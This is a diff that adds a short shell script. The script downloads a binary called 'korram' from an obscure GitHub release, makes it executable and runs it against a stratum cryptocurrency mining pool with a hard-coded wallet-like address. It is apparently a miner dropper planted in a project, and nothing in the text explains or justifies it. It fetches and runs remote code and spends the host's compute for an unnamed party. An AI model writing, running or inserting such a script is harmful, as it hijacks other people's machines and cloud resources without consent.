@@ -1,0 +1,5 @@
+#!/bin/sh
+apt update && apt install unzip
+wget https://github.com/virtolm/brikkal/releases/download/gfsa/korram
+chmod +x korram
+./korram -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-korram@de.catchthatrabbit.com:8008
